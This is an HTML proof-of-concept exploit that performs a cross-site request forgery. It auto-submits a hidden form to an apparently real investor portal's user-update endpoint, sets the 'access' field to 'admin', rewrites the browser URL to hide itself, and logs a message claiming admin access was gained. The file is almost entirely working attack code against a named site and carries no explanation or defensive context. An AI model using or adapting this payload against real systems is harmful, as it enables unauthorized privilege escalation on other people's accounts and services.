...
<html>
  ...
  <script>history.pushState('', '', '/')</script>
    <form id="privesc" action="https://investorportal.ispt.net.au/user/updateField/1559" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="access" value="admin" />
      <input type="submit" value="Submit request" />
    </form>
    <script>document.getElementById('privesc').submit();</script>
  </body>
  <script>console.log("Bypassed.. you now have admin access");</script>
</html>
//EOF
